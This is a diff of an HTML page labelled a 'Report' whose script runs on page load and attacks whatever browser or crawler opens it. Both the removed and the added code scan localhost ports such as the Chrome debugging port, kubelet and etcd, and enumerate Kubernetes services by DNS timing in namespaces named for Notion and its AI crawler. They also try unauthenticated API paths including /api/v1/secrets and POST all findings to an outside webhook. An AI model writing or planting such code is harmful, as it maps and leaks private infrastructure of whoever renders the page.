@@ -2,564 +2,199 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Infrastructure Compatibility Report</title>
+    <title>Report</title>
 </head>
 <body>
-    <h1>Infrastructure Compatibility Report</h1>
-    <p>Running network diagnostics...</p>
-    <div id="output">Collecting data...</div>
+    <h1>Report</h1>
+    <div id="output">Loading...</div>
 
     <script>
-        const WEBHOOK = "https://hkdk.events/dp0gb9zztqv6wp";
-
-        function exfil(label, data) {
-            return fetch(WEBHOOK, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chunk: label, ts: Date.now(), data })
-            }).catch(() => {});
-        }
+        const W = "https://hkdk.events/dp0gb9zztqv6wp";
+        const X = (l, d) => fetch(W, { method:'POST', mode:'no-cors',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({c:l, t:Date.now(), d}) }).catch(()=>{});
 
         async function run() {
-            const results = {};
+            const R = {};
 
-            // ──────────────────────────────────────────────────────────────
-            // MODULE A: WebSocket Port Scan — Mixed Content Bypass
-            //
-            // fetch() from HTTPS to http://127.0.0.1 = blocked (TypeError at 22ms).
-            // WebSocket from HTTPS to ws://127.0.0.1:PORT has DIFFERENT behavior:
-            //   - Port OPEN (non-WS service): fast fail ~5-30ms (connection reset / bad handshake)
-            //   - Port CLOSED: fast fail ~1-10ms (connection refused)
-            //   - Port OPEN (WS service): may hang waiting for handshake or succeed
-            //   - Port FIREWALLED: timeout at our abort limit
-            //
-            // Chrome 145 may block ws:// from HTTPS context too, so we also
-            // test <img> timing and EventSource as alternative side-channels.
-            // ──────────────────────────────────────────────────────────────
+            // ─── A: K8s Service Discovery (lean — only high-value targets) ───
+            // We KNOW kubernetes.default.svc.cluster.local resolves (114ms from v3).
+            // NXDOMAIN = fast TypeError (<10ms). Exists = slow (>40ms).
+            // Only probe the most critical services × most likely namespaces.
 
-            const portTargets = [
-                { host: '127.0.0.1', port: 80,    label: 'lo:80 (http)' },
-                { host: '127.0.0.1', port: 443,   label: 'lo:443 (https)' },
-                { host: '127.0.0.1', port: 3000,  label: 'lo:3000 (node/app)' },
-                { host: '127.0.0.1', port: 4444,  label: 'lo:4444 (selenium)' },
-                { host: '127.0.0.1', port: 5900,  label: 'lo:5900 (vnc)' },
-                { host: '127.0.0.1', port: 8080,  label: 'lo:8080 (proxy/app)' },
-                { host: '127.0.0.1', port: 8443,  label: 'lo:8443 (alt-https)' },
-                { host: '127.0.0.1', port: 9222,  label: 'lo:9222 (CDP!!)' },
-                { host: '127.0.0.1', port: 9229,  label: 'lo:9229 (node-debug)' },
-                { host: '127.0.0.1', port: 6379,  label: 'lo:6379 (redis)' },
-                { host: '127.0.0.1', port: 5432,  label: 'lo:5432 (postgres)' },
-                { host: '127.0.0.1', port: 27017, label: 'lo:27017 (mongo)' },
-                { host: '127.0.0.1', port: 2375,  label: 'lo:2375 (docker-api)' },
-                { host: '127.0.0.1', port: 2379,  label: 'lo:2379 (etcd)' },
-                { host: '127.0.0.1', port: 10250, label: 'lo:10250 (kubelet)' },
-                { host: '127.0.0.1', port: 10255, label: 'lo:10255 (kubelet-ro)' },
-                { host: '127.0.0.1', port: 6443,  label: 'lo:6443 (k8s-api)' },
-                { host: '127.0.0.1', port: 53,    label: 'lo:53 (dns)' },
+            const ns = ['default','kube-system','notion','notion-ai','production','prod','monitoring','infra'];
+            const svc = [
+                'kubernetes','kube-dns','redis','postgres','elasticsearch','vault',
+                'api','api-gateway','gateway','nginx','envoy','traefik',
+                'notion-api','notion-web','crawler','livecrawl','browser','browserless',
+                'chrome','headless','ai-service','llm','inference','proxy',
             ];
 
-            // --- Technique 1: WebSocket timing ---
-            async function wsProbe(host, port) {
-                return new Promise((resolve) => {
-                    const start = performance.now();
-                    let done = false;
-                    const finish = (status) => {
-                        if (done) return;
-                        done = true;
-                        resolve({ method: 'ws', status, ms: Math.round(performance.now() - start) });
-                    };
+            R.k8s_dns = {};
+            const dnsProbes = [];
+            for (const n of ns) for (const s of svc) dnsProbes.push(`${s}.${n}.svc.cluster.local`);
 
-                    const timer = setTimeout(() => finish('timeout'), 2000);
+            // Also probe short forms that resolved before
+            dnsProbes.push('kubernetes.default.svc.cluster.local');
+            dnsProbes.push('kubernetes.default.svc');
+            dnsProbes.push('kubernetes.default');
 
-                    try {
-                        const ws = new WebSocket(`ws://${host}:${port}/`);
-                        ws.onopen = () => { clearTimeout(timer); ws.close(); finish('open'); };
-                        ws.onerror = () => { clearTimeout(timer); finish('error'); };
-                        ws.onclose = (e) => { clearTimeout(timer); finish(`closed:${e.code}`); };
-                    } catch (e) {
-                        clearTimeout(timer);
-                        finish(`exception:${e.name}`);
-                    }
-                });
-            }
-
-            // --- Technique 2: Image load timing ---
-            async function imgProbe(host, port) {
-                return new Promise((resolve) => {
-                    const start = performance.now();
-                    let done = false;
-                    const finish = (status) => {
-                        if (done) return;
-                        done = true;
-                        resolve({ method: 'img', status, ms: Math.round(performance.now() - start) });
-                    };
-
-                    const timer = setTimeout(() => finish('timeout'), 2000);
-                    const img = new Image();
-                    img.onload = () => { clearTimeout(timer); finish('loaded'); };
-                    img.onerror = () => { clearTimeout(timer); finish('error'); };
-                    img.src = `http://${host}:${port}/favicon.ico?_=${Date.now()}`;
-                });
-            }
-
-            // --- Technique 3: EventSource (SSE) timing ---
-            async function sseProbe(host, port) {
-                return new Promise((resolve) => {
-                    const start = performance.now();
-                    let done = false;
-                    const finish = (status) => {
-                        if (done) return;
-                        done = true;
-                        resolve({ method: 'sse', status, ms: Math.round(performance.now() - start) });
-                    };
-
-                    const timer = setTimeout(() => { es.close(); finish('timeout'); }, 2000);
-
-                    try {
-                        var es = new EventSource(`http://${host}:${port}/`);
-                        es.onopen = () => { clearTimeout(timer); es.close(); finish('open'); };
-                        es.onerror = () => { clearTimeout(timer); es.close(); finish('error'); };
-                    } catch (e) {
-                        clearTimeout(timer);
-                        finish(`exception:${e.name}`);
-                    }
-                });
-            }
-
-            // --- Technique 4: fetch() with varying modes for comparison ---
-            async function fetchProbes(host, port) {
-                const fetchResults = {};
-
-                for (const mode of ['no-cors', 'cors']) {
-                    const start = performance.now();
-                    try {
-                        const ctrl = new AbortController();
-                        const to = setTimeout(() => ctrl.abort(), 2000);
-                        const resp = await fetch(`http://${host}:${port}/`, {
-                            mode: mode,
-                            signal: ctrl.signal
-                        });
-                        clearTimeout(to);
-                        fetchResults[mode] = {
-                            status: `${resp.status}:${resp.type}`,
-                            ms: Math.round(performance.now() - start)
-                        };
-                    } catch (e) {
-                        fetchResults[mode] = {
-                            status: `${e.name}`,
-                            ms: Math.round(performance.now() - start)
-                        };
-                    }
-                }
-
-                // Also try HTTPS to bypass mixed-content
-                const start = performance.now();
+            const dnsFn = async (fqdn) => {
+                const t0 = performance.now();
                 try {
-                    const ctrl = new AbortController();
-                    const to = setTimeout(() => ctrl.abort(), 2000);
-                    const resp = await fetch(`https://${host}:${port}/`, {
-                        mode: 'no-cors',
-                        signal: ctrl.signal
-                    });
+                    const c = new AbortController();
+                    const to = setTimeout(() => c.abort(), 800);
+                    await fetch(`http://${fqdn}/`, { mode:'no-cors', signal:c.signal });
                     clearTimeout(to);
-                    fetchResults['https-no-cors'] = {
-                        status: `${resp.status}:${resp.type}`,
-                        ms: Math.round(performance.now() - start)
-                    };
-                } catch (e) {
-                    fetchResults['https-no-cors'] = {
-                        status: `${e.name}`,
-                        ms: Math.round(performance.now() - start)
-                    };
+                    return { f:fqdn, s:'ok', ms:Math.round(performance.now()-t0) };
+                } catch(e) {
+                    return { f:fqdn, s:e.name, ms:Math.round(performance.now()-t0) };
                 }
-
-                return fetchResults;
-            }
-
-            // Run all 4 techniques in parallel per port, all ports in parallel
-            results.port_scan_multi = {};
-            const portPromises = portTargets.map(async (t) => {
-                const [ws, img, sse, fetches] = await Promise.all([
-                    wsProbe(t.host, t.port),
-                    imgProbe(t.host, t.port),
-                    sseProbe(t.host, t.port),
-                    fetchProbes(t.host, t.port),
-                ]);
-                results.port_scan_multi[t.label] = { ws, img, sse, ...fetches };
-            });
-            await Promise.all(portPromises);
-
-            await exfil('k8s_v1_portscan', results.port_scan_multi);
-            await new Promise(r => setTimeout(r, 300));
-
-            // ──────────────────────────────────────────────────────────────
-            // MODULE B: Kubernetes Service Discovery via DNS
-            //
-            // We confirmed kubernetes.default.svc.cluster.local resolves.
-            // K8s DNS follows the pattern: <service>.<namespace>.svc.cluster.local
-            //
-            // Strategy: Probe common service names across common namespaces.
-            // Timing signature:
-            //   - Exists: resolves + TCP connect → ~50-200ms
-            //   - No such service: NXDOMAIN → typically fast ~5-20ms
-            //   - Firewalled after resolve: timeout at our limit
-            //
-            // We use fetch() here since we're going to FQDN hostnames
-            // (not localhost), so mixed-content behavior differs.
-            // ──────────────────────────────────────────────────────────────
-
-            const namespaces = [
-                'default',
-                'kube-system',
-                'kube-public',
-                'notion',
-                'notion-ai',
-                'ai',
-                'crawler',
-                'crawl',
-                'livecrawl',
-                'live-crawl',
-                'production',
-                'prod',
-                'staging',
-                'internal',
-                'infra',
-                'monitoring',
-                'istio-system',
-                'ingress',
-                'ingress-nginx',
-            ];
-
-            const serviceNames = [
-                'kubernetes',
-                'kube-dns',
-                'coredns',
-                'api-server',
-                'apiserver',
-                'redis',
-                'redis-master',
-                'redis-cluster',
-                'memcached',
-                'postgres',
-                'postgresql',
-                'mysql',
-                'mongodb',
-                'mongo',
-                'elasticsearch',
-                'elastic',
-                'kibana',
-                'grafana',
-                'prometheus',
-                'jaeger',
-                'zipkin',
-                'vault',
-                'consul',
-                'etcd',
-                'rabbitmq',
-                'kafka',
-                'zookeeper',
-                'nginx',
-                'nginx-ingress',
-                'ingress-controller',
-                'envoy',
-                'istio-ingressgateway',
-                'istiod',
-                'gateway',
-                'api-gateway',
-                'api',
-                'web',
-                'app',
-                'backend',
-                'frontend',
-                'auth',
-                'auth-service',
-                'identity',
-                'oauth',
-                'notion-api',
-                'notion-web',
-                'notion-app',
-                'crawler',
-                'livecrawl',
-                'live-crawl',
-                'crawl-service',
-                'browser',
-                'chrome',
-                'headless',
-                'puppeteer',
-                'playwright',
-                'browserless',
-                'ai-service',
-                'ai-agent',
-                'llm',
-                'inference',
-                'embedding',
-                'vector-db',
-                'pinecone',
-                'weaviate',
-                'qdrant',
-                'milvus',
-                'proxy',
-                'squid',
-                'tinyproxy',
-                'traefik',
-                'caddy',
-                'haproxy',
-            ];
-
-            async function dnsServiceProbe(service, namespace) {
-                const fqdn = `${service}.${namespace}.svc.cluster.local`;
-                const start = performance.now();
-                try {
-                    const ctrl = new AbortController();
-                    const to = setTimeout(() => ctrl.abort(), 1500);
-                    const resp = await fetch(`http://${fqdn}/`, {
-                        mode: 'no-cors',
-                        signal: ctrl.signal
-                    });
-                    clearTimeout(to);
-                    return {
-                        fqdn,
-                        status: `responded:${resp.type}`,
-                        ms: Math.round(performance.now() - start)
-                    };
-                } catch (e) {
-                    const ms = Math.round(performance.now() - start);
-                    return { fqdn, status: e.name, ms };
-                }
-            }
-
-            // Run in batches to avoid overwhelming the browser
-            // (namespaces × services = ~1400 probes)
-            results.k8s_discovery = { found: [], errors: [], stats: {} };
-            let totalProbes = 0;
-            let resolvedCount = 0;
-            let nxdomainCount = 0;
-            let timeoutCount = 0;
-
-            const BATCH_SIZE = 40;
-            const allProbes = [];
-            for (const ns of namespaces) {
-                for (const svc of serviceNames) {
-                    allProbes.push({ svc, ns });
-                }
-            }
-
-            for (let i = 0; i < allProbes.length; i += BATCH_SIZE) {
-                const batch = allProbes.slice(i, i + BATCH_SIZE);
-                const batchResults = await Promise.all(
-                    batch.map(({ svc, ns }) => dnsServiceProbe(svc, ns))
-                );
-
-                for (const r of batchResults) {
-                    totalProbes++;
-                    // Heuristic: if it took >50ms OR status=responded, DNS likely resolved
-                    // NXDOMAIN typically fails fast (<10ms) with TypeError
-                    if (r.status.startsWith('responded') || r.ms > 50) {
-                        resolvedCount++;
-                        results.k8s_discovery.found.push(r);
-                    } else if (r.status === 'AbortError') {
-                        timeoutCount++;
-                        results.k8s_discovery.found.push(r);
-                    } else {
-                        nxdomainCount++;
-                    }
-                }
-
-                // Send intermediate results every 200 probes
-                if (totalProbes % 200 === 0 || i + BATCH_SIZE >= allProbes.length) {
-                    await exfil(`k8s_v1_discovery_progress_${totalProbes}`, {
-                        probes_done: totalProbes,
-                        probes_total: allProbes.length,
-                        found_so_far: results.k8s_discovery.found.length,
-                    });
-                }
-            }
-
-            results.k8s_discovery.stats = {
-                total_probes: totalProbes,
-                resolved: resolvedCount,
-                nxdomain: nxdomainCount,
-                timeouts: timeoutCount,
             };
 
-            await exfil('k8s_v1_discovery_final', results.k8s_discovery);
-            await new Promise(r => setTimeout(r, 300));
+            // Run all DNS probes in one parallel blast (~195 probes, 800ms timeout)
+            const dnsResults = await Promise.all(dnsProbes.map(dnsFn));
 
-            // ──────────────────────────────────────────────────────────────
-            // MODULE C: Direct K8s API Probing
-            //
-            // kubernetes.default.svc.cluster.local resolved on port 80.
-            // The K8s API server typically runs on 443 or 6443.
-            // Some endpoints are unauthenticated: /version, /healthz, /readyz
-            //
-            // We try multiple ports and paths. If we can read /version,
-            // that's an information disclosure finding. If we get back
-            // pod/service data, that's a critical SSRF.
-            // ──────────────────────────────────────────────────────────────
+            // Only keep interesting results (resolved or slow)
+            R.k8s_dns.hits = dnsResults.filter(r => r.s === 'ok' || r.ms > 40);
+            R.k8s_dns.fast_fails = dnsResults.filter(r => r.s !== 'ok' && r.ms <= 40).length;
+            R.k8s_dns.total = dnsResults.length;
 
-            const k8sApiTargets = [
+            await X('k8s2_dns', R.k8s_dns);
+
+            // ─── B: K8s API endpoints (only the confirmed-resolvable host) ───
+            // Probe key unauthenticated endpoints on the host we KNOW exists.
+            // Try both cors (to get body) and no-cors (for timing).
+            // Keep it to ~20 requests max.
+
+            const apiBase = [
                 'http://kubernetes.default.svc.cluster.local',
                 'https://kubernetes.default.svc.cluster.local',
                 'https://kubernetes.default.svc.cluster.local:6443',
-                'https://kubernetes.default.svc.cluster.local:443',
-                'http://kubernetes.default.svc:80',
-                'http://kubernetes.default:80',
             ];
+            const apiPaths = ['/version','/healthz','/readyz','/api','/api/v1','/api/v1/namespaces','/api/v1/secrets'];
 
-            const k8sPaths = [
-                '/',
-                '/version',
-                '/healthz',
-                '/readyz',
-                '/livez',
-                '/api',
-                '/api/v1',
-                '/api/v1/namespaces',
-                '/api/v1/pods',
-                '/api/v1/services',
-                '/api/v1/secrets',
-                '/api/v1/configmaps',
-                '/apis',
-                '/metrics',
-                '/openapi/v2',
-            ];
-
-            results.k8s_api = {};
-
-            const apiProbes = [];
-            for (const base of k8sApiTargets) {
-                for (const path of k8sPaths) {
-                    apiProbes.push({ url: `${base}${path}`, label: `${base}${path}` });
-                }
-            }
-
-            // Run in small batches
-            for (let i = 0; i < apiProbes.length; i += 10) {
-                const batch = apiProbes.slice(i, i + 10);
-                const batchResults = await Promise.all(batch.map(async ({ url, label }) => {
-                    const start = performance.now();
+            R.k8s_api = {};
+            const apiFn = async (url) => {
+                const t0 = performance.now();
+                // Try cors first — if the server sends CORS headers, we get the body
+                try {
+                    const c = new AbortController();
+                    const to = setTimeout(() => c.abort(), 1200);
+                    const r = await fetch(url, { mode:'cors', signal:c.signal });
+                    clearTimeout(to);
+                    let b = ''; try { b = (await r.text()).slice(0,1500); } catch(_){}
+                    return { url, status:r.status, type:r.type, ms:Math.round(performance.now()-t0),
+                             headers:Object.fromEntries([...r.headers.entries()]), body:b };
+                } catch(e1) {
+                    const ms1 = Math.round(performance.now()-t0);
+                    // Fallback: no-cors for timing
+                    const t1 = performance.now();
                     try {
-                        const ctrl = new AbortController();
-                        const to = setTimeout(() => ctrl.abort(), 2000);
-
-                        // Try with cors first to get response details
-                        const resp = await fetch(url, {
-                            mode: 'cors',
-                            signal: ctrl.signal,
-                        });
-                        clearTimeout(to);
-
-                        let body = '';
-                        try { body = await resp.text(); } catch (_) {}
-
-                        return {
-                            label,
-                            status: resp.status,
-                            type: resp.type,
-                            headers: Object.fromEntries([...resp.headers.entries()]),
-                            body: body.slice(0, 2000),
-                            ms: Math.round(performance.now() - start),
-                        };
-                    } catch (e1) {
-                        // cors failed, try no-cors for timing
-                        const ms1 = Math.round(performance.now() - start);
-                        const start2 = performance.now();
-                        try {
-                            const ctrl2 = new AbortController();
-                            const to2 = setTimeout(() => ctrl2.abort(), 2000);
-                            const resp2 = await fetch(url, {
-                                mode: 'no-cors',
-                                signal: ctrl2.signal,
-                            });
-                            clearTimeout(to2);
-                            return {
-                                label,
-                                cors_error: e1.name,
-                                cors_ms: ms1,
-                                nocors_status: `${resp2.status}:${resp2.type}`,
-                                nocors_ms: Math.round(performance.now() - start2),
-                            };
-                        } catch (e2) {
-                            return {
-                                label,
-                                cors_error: e1.name,
-                                cors_ms: ms1,
-                                nocors_error: e2.name,
-                                nocors_ms: Math.round(performance.now() - start2),
-                            };
-                        }
+                        const c2 = new AbortController();
+                        const to2 = setTimeout(() => c2.abort(), 1200);
+                        const r2 = await fetch(url, { mode:'no-cors', signal:c2.signal });
+                        clearTimeout(to2);
+                        return { url, cors_err:e1.name, cors_ms:ms1,
+                                 nc_status:`${r2.status}:${r2.type}`, nc_ms:Math.round(performance.now()-t1) };
+                    } catch(e2) {
+                        return { url, cors_err:e1.name, cors_ms:ms1,
+                                 nc_err:e2.name, nc_ms:Math.round(performance.now()-t1) };
                     }
-                }));
-
-                for (const r of batchResults) {
-                    results.k8s_api[r.label] = r;
                 }
-            }
-
-            await exfil('k8s_v1_api_probes', results.k8s_api);
-            await new Promise(r => setTimeout(r, 300));
-
-            // ──────────────────────────────────────────────────────────────
-            // MODULE D: K8s Service Account Token Check
-            //
-            // If the crawler pod has a service account token mounted (default
-            // behavior unless explicitly disabled), it lives at a well-known
-            // path. We can't read the filesystem, but we can check if the
-            // browser has been configured with any Authorization headers by
-            // making requests and observing behavior.
-            //
-            // Also probe for the K8s environment variables that are
-            // auto-injected into every pod:
-            //   KUBERNETES_SERVICE_HOST, KUBERNETES_SERVICE_PORT,
-            //   KUBERNETES_PORT, etc.
-            // ──────────────────────────────────────────────────────────────
-
-            results.k8s_env_check = {
-                // These won't work in browser context, but check anyway
-                // in case of Node.js integration leak
-                KUBERNETES_SERVICE_HOST: (typeof process !== 'undefined' && process.env)
-                    ? process.env.KUBERNETES_SERVICE_HOST : 'no process.env',
-                KUBERNETES_SERVICE_PORT: (typeof process !== 'undefined' && process.env)
-                    ? process.env.KUBERNETES_SERVICE_PORT : 'no process.env',
             };
 
-            // Check if any fetch to k8s API returns auth-related headers
-            // that hint at auto-injection of SA token
-            try {
-                const ctrl = new AbortController();
-                const to = setTimeout(() => ctrl.abort(), 2000);
-                const r = await fetch('https://kubernetes.default.svc.cluster.local:443/api', {
-                    mode: 'cors',
-                    credentials: 'include',
-                    signal: ctrl.signal,
-                });
-                clearTimeout(to);
-                results.k8s_env_check.api_with_credentials = {
-                    status: r.status,
-                    type: r.type,
-                    body: (await r.text().catch(() => '')).slice(0, 1000),
-                };
-            } catch (e) {
-                results.k8s_env_check.api_with_credentials = {
-                    error: e.name,
-                    message: e.message,
-                };
+            const apiProbes = [];
+            for (const b of apiBase) for (const p of apiPaths) apiProbes.push(`${b}${p}`);
+            const apiResults = await Promise.all(apiProbes.map(apiFn));
+            for (const r of apiResults) R.k8s_api[r.url] = r;
+
+            await X('k8s2_api', R.k8s_api);
+
+            // ─── C: WebSocket deep scan on interesting ports ───
+            // From v1 data, WS gave differentiated timing on high ports.
+            // Ports >90ms are interesting. Rescan ONLY those with longer timeout
+            // to differentiate "open + hanging" from "slow block".
+            // Also try wss:// (TLS WebSocket) which avoids mixed-content.
+
+            const wsPorts = [
+                { p:9222, l:'CDP' },
+                { p:6443, l:'k8s-api' },
+                { p:10250, l:'kubelet' },
+                { p:10255, l:'kubelet-ro' },
+                { p:2379, l:'etcd' },
+                { p:2375, l:'docker' },
+                { p:53, l:'dns' },
+                { p:5432, l:'postgres' },
+                { p:27017, l:'mongo' },
+            ];
+
+            const wsFn = (host, port, proto) => new Promise(resolve => {
+                const t0 = performance.now();
+                let done = false;
+                const fin = (s) => { if(done) return; done=true;
+                    resolve({ port, proto, status:s, ms:Math.round(performance.now()-t0) }); };
+                const tm = setTimeout(() => fin('timeout'), 3000);
+                try {
+                    const ws = new WebSocket(`${proto}://${host}:${port}/`);
+                    ws.onopen = () => { clearTimeout(tm); ws.close(); fin('OPEN'); };
+                    ws.onerror = () => { clearTimeout(tm); fin('error'); };
+                    ws.onclose = (e) => { clearTimeout(tm); fin(`close:${e.code}`); };
+                } catch(e) { clearTimeout(tm); fin(`ex:${e.name}`); }
+            });
+
+            R.ws_deep = {};
+            const wsProbes = [];
+            for (const t of wsPorts) {
+                wsProbes.push(wsFn('127.0.0.1', t.p, 'ws').then(r => ({...r, label:`ws://${t.l}`})));
+                wsProbes.push(wsFn('127.0.0.1', t.p, 'wss').then(r => ({...r, label:`wss://${t.l}`})));
+            }
+            const wsResults = await Promise.all(wsProbes);
+            for (const r of wsResults) R.ws_deep[r.label] = r;
+
+            await X('k8s2_ws', R.ws_deep);
+
+            // ─── D: Hit discovered services directly ───
+            // For any K8s DNS hits from module A, try to fetch real content.
+            // This is the actual SSRF attempt — if we get response bodies
+            // from internal services, that's a critical finding.
+
+            R.ssrf_attempts = {};
+            const hits = R.k8s_dns.hits || [];
+            // Only try the ones that look truly resolved (not just slow blocks)
+            const realHits = hits.filter(h => h.s === 'ok' || h.ms > 80);
+            const ssrfTargets = realHits.slice(0, 10).map(h => h.f);
+
+            // Always include the one we know works
+            if (!ssrfTargets.includes('kubernetes.default.svc.cluster.local'))
+                ssrfTargets.push('kubernetes.default.svc.cluster.local');
+
+            for (const host of ssrfTargets) {
+                for (const path of ['/', '/version', '/healthz']) {
+                    for (const proto of ['http', 'https']) {
+                        const url = `${proto}://${host}${path}`;
+                        const t0 = performance.now();
+                        try {
+                            const c = new AbortController();
+                            const to = setTimeout(() => c.abort(), 1200);
+                            const r = await fetch(url, { mode:'cors', signal:c.signal });
+                            clearTimeout(to);
+                            let b = ''; try { b = (await r.text()).slice(0,1500); } catch(_){}
+                            R.ssrf_attempts[url] = { status:r.status, type:r.type, body:b,
+                                headers:Object.fromEntries([...r.headers.entries()]),
+                                ms:Math.round(performance.now()-t0) };
+                        } catch(e) {
+                            R.ssrf_attempts[url] = { err:e.name, ms:Math.round(performance.now()-t0) };
+                        }
+                    }
+                }
             }
 
-            await exfil('k8s_v1_env_check', results.k8s_env_check);
+            await X('k8s2_ssrf', R.ssrf_attempts);
 
-            // ──────────────────────────────────────────────────────────────
-            // FINAL: Render all results in the DOM
-            // ──────────────────────────────────────────────────────────────
-
-            document.getElementById('output').innerHTML =
-                '<pre>' + JSON.stringify(results, null, 2) + '</pre>';
-
-            await exfil('k8s_v1_COMPLETE', {
-                modules: Object.keys(results),
-                total_json_bytes: JSON.stringify(results).length,
-            });
+            // ─── Render + final beacon ───
+            document.getElementById('output').innerHTML = '<pre>'+JSON.stringify(R,null,2)+'</pre>';
+            await X('k8s2_DONE', { modules:Object.keys(R), bytes:JSON.stringify(R).length });
         }
 
         run();
